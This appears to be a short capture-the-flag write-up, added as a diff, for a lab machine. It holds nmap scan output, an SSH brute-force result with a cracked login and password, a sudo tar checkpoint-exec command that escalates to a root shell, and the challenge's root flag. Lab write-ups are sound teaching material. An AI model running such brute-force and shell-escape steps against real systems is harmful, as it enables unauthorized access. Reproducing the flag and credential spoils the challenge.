@@ -1,0 +1,29 @@
+I found open ports on the machine with the following details:
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
+|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
+|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+
+I visited the FTP server and found two text files, which listed tasks.
+
+For the SSH service, I attempted to brute-force the login using the text files I found. The attack details are as follows:
+
+[DATA] attacking ssh://10.10.11.203:22/
+[22][ssh] host: 10.10.11.203   login: lin   password: RedDr4gonSynd1cat3
+
+I successfully logged in and obtained the user.txt flag.
+
+Next, I checked which commands the lin user could run with sudo privileges by using the command sudo -l. It turns out that lin is allowed to run tar with sudo, which might allow privilege escalation.
+
+To escalate privileges, I used the following command:
+
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+This gave me root access, and I found the root.txt flag with the value THM{80UN7Y_h4cK3r}.
+
